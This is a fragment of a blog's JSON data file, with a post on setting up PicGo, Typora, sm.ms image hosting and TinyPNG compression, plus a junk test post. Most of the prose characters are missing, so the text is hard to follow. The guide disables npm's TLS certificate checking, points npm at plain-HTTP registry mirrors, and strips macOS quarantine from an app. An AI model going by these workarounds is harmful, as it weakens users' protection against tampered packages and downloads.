></p>\n<ul>\n<li>ktv</li>\n</ul>\n<h2 id=\"5-12\"><a href=\"#5-12\" class=\"headerlink\" title=\"5.12\"></a>5.12</h2><p></p>\n<p>web</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg\"\n                        alt=\"Xnip2024-05-12_12-42-33\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg\"\n                        alt=\"4e462780ed0f89e5da35f90564ba25be\"\n                 ></p>\n<p></p>\n<h2 id=\"5-13\"><a href=\"#5-13\" class=\"headerlink\" title=\"5.13\"></a>5.13</h2><p></p>\n<p></p>\n"},{"title":"picgo+typora+sm.ms+tinypng","date":"2024-05-13T19:01:11.000Z","excerpt":"picgo+typora+sm.ms+tinypng","_content":"\n\n\n# picgo+typora+sm.ms+tinypng\n\n\n\n## \n\ngithubsm.mssm.ms\n\n\n\n\n\n## typora\n\n\n\n![image-20240514023823816](https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png)\n\n\n\n## picgo\n\n****https://github.com/PicGo\n\nPicGoAPI TokenSM.MSSMMStokenOSStokentoken2API Token\n\n![image-20240514024315478](https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png)\n\n## sm.ms\n\nSMMS\n\n[https://sm.ms/](https://link.zhihu.com/?target=https%3A//sm.ms/)\n\nhttps://smms.app/\n\n![image-20240514024117130](https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png)\n\n\n\n\n\n\n\nSign UpSMMS\n\n![image-20240514024152185](https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png)\n\n\n\n\n\n### Token\n\nSMMSAPI TokenGenerate Secret Tokentoken\n\n![image-20240514024251486](https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png)\n\n\n\n## tinypng\n\npicgotinypng** **\n\n![image-20240514024652599](https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png)\n\n![image-20240514024935584](https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png)\n\n\n\napi\n\n\n\n\n\n## \n\n### \n\n### picgo\n\n```\nsudo xattr -d com.apple.quarantine \"/Applications/PicGo.app\"\n```\n\n\n\n\n\n```\nnpm install picgo -g\n```\n\n```\n\n\n picgo add compress\n\n picgo use transformer\n\n picgo config plugin compress\n```\n\ncompress  \n\n- [tinypng](https://tinypng.com/)  tinypng\n- [imagemin](https://github.com/imagemin/imagemin) \n- image2webp  GIF   sm.ms webp \n\n![image-20240514025424708](https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png)\n\n\n\n### **reason: certificate has expired **\n\n![image-20240514025542618](https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png)\n\n\n\n\n\n```\n1ssl\n \nnpm config set strict-ssl false\n \n\n \n \n2npm\n \nnpm config set registry http://registry.cnpmjs.org\nnpm config set registry http://registry.npm.taobao.org\n \n```\n\n\n\n\n\n### gui\n\n```\nnpm install picgo -g\nnpm install ./picgo-plugin-<your-plugin-name>\n```\n\nelectronPicGo\n\n- Windows: `%APPDATA%\\picgo\\data.json`\n- Linux: `$XDG_CONFIG_HOME/picgo/data.json` or `~/.config/picgo/data.json`\n- macOS: `~/Library/Application\\ Support/picgo/data.json`\n\nwindows\n\n`C:\\Users\\\\AppData\\Roaming\\picgo\\data.json`\n\nlinux\n\n`~/.config/picgo/data.json`\n\nmacOS\n\n `/usr/home/picgo-plugin-<your-plugin-name>`\n\nPicGo\n\n```\nnpm install /usr/home/picgo-plugin-<your-plugin-name>\n```\n\n\n\n### \n\n\n\n**tingpng**https://github.com/liujinpen/picgo-plugin-compress-tinypng\n\n\n\nnpm\n\nMacpicgo /Users/cunyu/Library/Application Support/picgo\n\n cd Mac\n\n```\nbrew install libtool automake autoconf nasm\n```\n\n    \n\nhomebrew\n\n****\n\n\n\n```\nnpm cache clean --force\n```\n\n    \n\n\n\nnode_modules\n\ninstall\n\n```\nnpm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org\n```\n\n      \n\n\n\n```\nnpm install --registry=https://registry.npm.taobao.org\n```\n\n\n\n\n\n\n\n```\ncd \"Application Support\"\ncd Application/Support\n```\n\n","source":"_posts/picgo+typora+sm.ms+tinypng.md","raw":"---\ntitle: picgo+typora+sm.ms+tinypng\ndate: 2024-05-14 03:01:11\nexcerpt: picgo+typora+sm.ms+tinypng\ncategories: \n---\n\n\n\n# picgo+typora+sm.ms+tinypng\n\n\n\n## \n\ngithubsm.mssm.ms\n\n\n\n\n\n## typora\n\n\n\n![image-20240514023823816](https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png)\n\n\n\n## picgo\n\n****https://github.com/PicGo\n\nPicGoAPI TokenSM.MSSMMStokenOSStokentoken2API Token\n\n![image-20240514024315478](https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png)\n\n## sm.ms\n\nSMMS\n\n[https://sm.ms/](https://link.zhihu.com/?target=https%3A//sm.ms/)\n\nhttps://smms.app/\n\n![image-20240514024117130](https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png)\n\n\n\n\n\n\n\nSign UpSMMS\n\n![image-20240514024152185](https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png)\n\n\n\n\n\n### Token\n\nSMMSAPI TokenGenerate Secret Tokentoken\n\n![image-20240514024251486](https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png)\n\n\n\n## tinypng\n\npicgotinypng** **\n\n![image-20240514024652599](https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png)\n\n![image-20240514024935584](https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png)\n\n\n\napi\n\n\n\n\n\n## \n\n### \n\n### picgo\n\n```\nsudo xattr -d com.apple.quarantine \"/Applications/PicGo.app\"\n```\n\n\n\n\n\n```\nnpm install picgo -g\n```\n\n```\n\n\n picgo add compress\n\n picgo use transformer\n\n picgo config plugin compress\n```\n\ncompress  \n\n- [tinypng](https://tinypng.com/)  tinypng\n- [imagemin](https://github.com/imagemin/imagemin) \n- image2webp  GIF   sm.ms webp \n\n![image-20240514025424708](https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png)\n\n\n\n### **reason: certificate has expired **\n\n![image-20240514025542618](https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png)\n\n\n\n\n\n```\n1ssl\n \nnpm config set strict-ssl false\n \n\n \n \n2npm\n \nnpm config set registry http://registry.cnpmjs.org\nnpm config set registry http://registry.npm.taobao.org\n \n```\n\n\n\n\n\n### gui\n\n```\nnpm install picgo -g\nnpm install ./picgo-plugin-<your-plugin-name>\n```\n\nelectronPicGo\n\n- Windows: `%APPDATA%\\picgo\\data.json`\n- Linux: `$XDG_CONFIG_HOME/picgo/data.json` or `~/.config/picgo/data.json`\n- macOS: `~/Library/Application\\ Support/picgo/data.json`\n\nwindows\n\n`C:\\Users\\\\AppData\\Roaming\\picgo\\data.json`\n\nlinux\n\n`~/.config/picgo/data.json`\n\nmacOS\n\n `/usr/home/picgo-plugin-<your-plugin-name>`\n\nPicGo\n\n```\nnpm install /usr/home/picgo-plugin-<your-plugin-name>\n```\n\n\n\n### \n\n\n\n**tingpng**https://github.com/liujinpen/picgo-plugin-compress-tinypng\n\n\n\nnpm\n\nMacpicgo /Users/cunyu/Library/Application Support/picgo\n\n cd Mac\n\n```\nbrew install libtool automake autoconf nasm\n```\n\n    \n\nhomebrew\n\n****\n\n\n\n```\nnpm cache clean --force\n```\n\n    \n\n\n\nnode_modules\n\ninstall\n\n```\nnpm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org\n```\n\n      \n\n\n\n```\nnpm install --registry=https://registry.npm.taobao.org\n```\n\n\n\n\n\n\n\n```\ncd \"Application Support\"\ncd Application/Support\n```\n\n","slug":"picgo+typora+sm.ms+tinypng","published":1,"updated":"2024-05-13T19:03:33.581Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clw5c18lb00003j767dr1gvht","content":"<h1 id=\"picgo-typora-sm-ms-tinypng\"><a href=\"#picgo-typora-sm-ms-tinypng\" class=\"headerlink\" title=\"picgo+typora+sm.ms+tinypng\"></a>picgo+typora+sm.ms+tinypng</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>githubsm.mssm.ms</p>\n<p></p>\n<h2 id=\"typora\"><a href=\"#typora\" class=\"headerlink\" title=\"typora\"></a>typora</h2><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png\"\n                        alt=\"image-20240514023823816\"\n                 ></p>\n<h2 id=\"picgo\"><a href=\"#picgo\" class=\"headerlink\" title=\"picgo\"></a>picgo</h2><p><strong></strong><a class=\"link\"   href=\"https://github.com/PicGo\" >https://github.com/PicGo<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>PicGoAPI TokenSM.MSSMMStokenOSStokentoken2API Token</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png\"\n                        alt=\"image-20240514024315478\"\n                 ></p>\n<h2 id=\"sm-ms\"><a href=\"#sm-ms\" class=\"headerlink\" title=\"sm.ms\"></a>sm.ms</h2><p>SMMS</p>\n<p><a class=\"link\"   href=\"https://link.zhihu.com/?target=https://sm.ms/\" >https://sm.ms/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://smms.app/\" >https://smms.app/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png\"\n                        alt=\"image-20240514024117130\"\n                 ></p>\n<p>Sign UpSMMS</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png\"\n                        alt=\"image-20240514024152185\"\n                 ></p>\n<h3 id=\"Token\"><a href=\"#Token\" class=\"headerlink\" title=\"Token\"></a>Token</h3><p>SMMSAPI TokenGenerate Secret Tokentoken</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png\"\n                        alt=\"image-20240514024251486\"\n                 ></p>\n<h2 id=\"tinypng\"><a href=\"#tinypng\" class=\"headerlink\" title=\"tinypng\"></a>tinypng</h2><p>picgotinypng<strong> </strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png\"\n                        alt=\"image-20240514024652599\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png\"\n                        alt=\"image-20240514024935584\"\n                 ></p>\n<p>api</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"picgo\"><a href=\"#picgo\" class=\"headerlink\" title=\"picgo\"></a>picgo</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo xattr -d com.apple.quarantine &quot;/Applications/PicGo.app&quot;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> picgo add compress</span><br><span class=\"line\"></span><br><span class=\"line\"> picgo use transformer</span><br><span class=\"line\"></span><br><span class=\"line\"> picgo config plugin compress</span><br></pre></td></tr></table></figure>\n\n<p>compress  </p>\n<ul>\n<li><a class=\"link\"   href=\"https://tinypng.com/\" >tinypng<i class=\"fas fa-external-link-alt\"></i></a>  tinypng</li>\n<li><a class=\"link\"   href=\"https://github.com/imagemin/imagemin\" >imagemin<i class=\"fas fa-external-link-alt\"></i></a> </li>\n<li>image2webp  GIF   sm.ms webp </li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png\"\n                        alt=\"image-20240514025424708\"\n                 ></p>\n<h3 id=\"reason-certificate-has-expired-\"><a href=\"#reason-certificate-has-expired-\" class=\"headerlink\" title=\"reason: certificate has expired \"></a><strong>reason: certificate has expired </strong></h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png\"\n                        alt=\"image-20240514025542618\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1ssl</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set strict-ssl false</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">2npm</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set registry http://registry.cnpmjs.org</span><br><span class=\"line\">npm config set registry http://registry.npm.taobao.org</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"gui\"><a href=\"#gui\" class=\"headerlink\" title=\"gui\"></a>gui</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br><span class=\"line\">npm install ./picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n<p>electronPicGo</p>\n<ul>\n<li>Windows: <code>%APPDATA%\\picgo\\data.json</code></li>\n<li>Linux: <code>$XDG_CONFIG_HOME/picgo/data.json</code> or <code>~/.config/picgo/data.json</code></li>\n<li>macOS: <code>~/Library/Application\\ Support/picgo/data.json</code></li>\n</ul>\n<p>windows</p>\n<p><code>C:\\Users\\\\AppData\\Roaming\\picgo\\data.json</code></p>\n<p>linux</p>\n<p><code>~/.config/picgo/data.json</code></p>\n<p>macOS</p>\n<p> <code>/usr/home/picgo-plugin-&lt;your-plugin-name&gt;</code></p>\n<p>PicGo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install /usr/home/picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong>tingpng</strong><a class=\"link\"   href=\"https://github.com/liujinpen/picgo-plugin-compress-tinypng\" >https://github.com/liujinpen/picgo-plugin-compress-tinypng<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>npm</p>\n<p>Macpicgo &#x2F;Users&#x2F;cunyu&#x2F;Library&#x2F;Application Support&#x2F;picgo</p>\n<p> cd Mac</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install libtool automake autoconf nasm</span><br></pre></td></tr></table></figure>\n\n<p>    </p>\n<p>homebrew</p>\n<p><strong></strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clean --force</span><br></pre></td></tr></table></figure>\n\n<p>    </p>\n<p></p>\n<p>node_modules</p>\n<p>install</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>      </p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &quot;Application Support&quot;</span><br><span class=\"line\">cd Application/Support</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"picgo-typora-sm-ms-tinypng\"><a href=\"#picgo-typora-sm-ms-tinypng\" class=\"headerlink\" title=\"picgo+typora+sm.ms+tinypng\"></a>picgo+typora+sm.ms+tinypng</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>githubsm.mssm.ms</p>\n<p></p>\n<h2 id=\"typora\"><a href=\"#typora\" class=\"headerlink\" title=\"typora\"></a>typora</h2><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png\"\n                        alt=\"image-20240514023823816\"\n                 ></p>\n<h2 id=\"picgo\"><a href=\"#picgo\" class=\"headerlink\" title=\"picgo\"></a>picgo</h2><p><strong></strong><a class=\"link\"   href=\"https://github.com/PicGo\" >https://github.com/PicGo<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>PicGoAPI TokenSM.MSSMMStokenOSStokentoken2API Token</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png\"\n                        alt=\"image-20240514024315478\"\n                 ></p>\n<h2 id=\"sm-ms\"><a href=\"#sm-ms\" class=\"headerlink\" title=\"sm.ms\"></a>sm.ms</h2><p>SMMS</p>\n<p><a class=\"link\"   href=\"https://link.zhihu.com/?target=https://sm.ms/\" >https://sm.ms/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://smms.app/\" >https://smms.app/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png\"\n                        alt=\"image-20240514024117130\"\n                 ></p>\n<p>Sign UpSMMS</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png\"\n                        alt=\"image-20240514024152185\"\n                 ></p>\n<h3 id=\"Token\"><a href=\"#Token\" class=\"headerlink\" title=\"Token\"></a>Token</h3><p>SMMSAPI TokenGenerate Secret Tokentoken</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png\"\n                        alt=\"image-20240514024251486\"\n                 ></p>\n<h2 id=\"tinypng\"><a href=\"#tinypng\" class=\"headerlink\" title=\"tinypng\"></a>tinypng</h2><p>picgotinypng<strong> </strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png\"\n                        alt=\"image-20240514024652599\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png\"\n                        alt=\"image-20240514024935584\"\n                 ></p>\n<p>api</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"picgo\"><a href=\"#picgo\" class=\"headerlink\" title=\"picgo\"></a>picgo</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo xattr -d com.apple.quarantine &quot;/Applications/PicGo.app&quot;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> picgo add compress</span><br><span class=\"line\"></span><br><span class=\"line\"> picgo use transformer</span><br><span class=\"line\"></span><br><span class=\"line\"> picgo config plugin compress</span><br></pre></td></tr></table></figure>\n\n<p>compress  </p>\n<ul>\n<li><a class=\"link\"   href=\"https://tinypng.com/\" >tinypng<i class=\"fas fa-external-link-alt\"></i></a>  tinypng</li>\n<li><a class=\"link\"   href=\"https://github.com/imagemin/imagemin\" >imagemin<i class=\"fas fa-external-link-alt\"></i></a> </li>\n<li>image2webp  GIF   sm.ms webp </li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png\"\n                        alt=\"image-20240514025424708\"\n                 ></p>\n<h3 id=\"reason-certificate-has-expired-\"><a href=\"#reason-certificate-has-expired-\" class=\"headerlink\" title=\"reason: certificate has expired \"></a><strong>reason: certificate has expired </strong></h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png\"\n                        alt=\"image-20240514025542618\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1ssl</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set strict-ssl false</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">2npm</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set registry http://registry.cnpmjs.org</span><br><span class=\"line\">npm config set registry http://registry.npm.taobao.org</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"gui\"><a href=\"#gui\" class=\"headerlink\" title=\"gui\"></a>gui</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br><span class=\"line\">npm install ./picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n<p>electronPicGo</p>\n<ul>\n<li>Windows: <code>%APPDATA%\\picgo\\data.json</code></li>\n<li>Linux: <code>$XDG_CONFIG_HOME/picgo/data.json</code> or <code>~/.config/picgo/data.json</code></li>\n<li>macOS: <code>~/Library/Application\\ Support/picgo/data.json</code></li>\n</ul>\n<p>windows</p>\n<p><code>C:\\Users\\\\AppData\\Roaming\\picgo\\data.json</code></p>\n<p>linux</p>\n<p><code>~/.config/picgo/data.json</code></p>\n<p>macOS</p>\n<p> <code>/usr/home/picgo-plugin-&lt;your-plugin-name&gt;</code></p>\n<p>PicGo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install /usr/home/picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong>tingpng</strong><a class=\"link\"   href=\"https://github.com/liujinpen/picgo-plugin-compress-tinypng\" >https://github.com/liujinpen/picgo-plugin-compress-tinypng<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>npm</p>\n<p>Macpicgo &#x2F;Users&#x2F;cunyu&#x2F;Library&#x2F;Application Support&#x2F;picgo</p>\n<p> cd Mac</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install libtool automake autoconf nasm</span><br></pre></td></tr></table></figure>\n\n<p>    </p>\n<p>homebrew</p>\n<p><strong></strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clean --force</span><br></pre></td></tr></table></figure>\n\n<p>    </p>\n<p></p>\n<p>node_modules</p>\n<p>install</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>      </p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &quot;Application Support&quot;</span><br><span class=\"line\">cd Application/Support</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"dsajdlkajsklajskldsjak","source":"_posts/test111.md","raw":"dsajdlkajsklajskldsjak","slug":"test111","published":1,"date":"2024-05-15T14:24:17.900Z","updated":"2024-05-15T14:24:17.900Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"clw7wy5pd0000hw0a8c57dhkc","content":"<p>dsajdlkajsklajskldsjak</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD 